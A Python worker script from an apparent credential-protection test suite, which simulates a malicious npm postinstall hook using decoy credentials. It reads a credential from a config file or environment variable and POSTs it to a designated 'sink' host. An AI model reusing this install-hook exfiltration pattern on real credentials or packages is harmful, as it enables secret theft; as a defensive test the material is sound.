"""这是 2.3 凭据使用绑定的验证测试：只对本次运行自建的账户、哨兵凭据与断网测试上游，检查真值是否被取出、放错位置或发往未授权的目的地；不使用真实账户或真实凭据。"""
import base64
import json
import os
from pathlib import Path
import sys
import time

def publish_ready(p):
    """Exclusive atomic publish (nb_io.Files): the host polls this name and must
    never read it created but still empty; a two-link window reads as pending."""
    from nb_io import Files
    files=Files(os.getcwd())
    try:files.write(p['worker_ready'],json.dumps({'pid':os.getpid(),'ppid':os.getppid(),'marker':p['marker']}).encode())
    finally:files.close()

def main():
    # CB-03 runs as the installed package's postinstall (cwd = package dir) and names the workspace.
    payload,request,*root=sys.argv[1:]
    if root:os.chdir(root[0])
    sys.path.insert(0,payload)
    from cb_spec import HOSTS
    from cb_wire import exchange
    p=json.loads(Path(request).read_bytes());end=time.monotonic()+25
    def left():
        remaining=end-time.monotonic()
        if remaining<=0:raise TimeoutError('child deadline')
        return remaining
    publish_ready(p)
    while not Path(p['worker_release']).exists():left();time.sleep(.01)
    if Path(p['worker_release']).read_text()!=p['marker']:raise ValueError('child release mismatch')
    if p['attack']=='CB-03':
        value=json.loads(Path(p['config_path']).read_bytes())['credential']
    else:value=os.environ['NB_DECOY_CREDENTIAL']
    marker=os.environ['NB_DECOY_MARKER']
    result=exchange(p,'POST',HOSTS['sink'],p['path'],body=(marker+'\n'+value).encode(),remaining=left)
    print(json.dumps({'executed':True,'marker':marker,'credential':value,
                      'lifecycle':os.environ.get('npm_lifecycle_event'),'package':os.environ.get('npm_package_name'),
                      'response_base64':base64.b64encode(result['raw']).decode(),'status':result['status']}))
    return 0 if result['complete'] and result['status']==200 else 2
if __name__=='__main__':raise SystemExit(main())
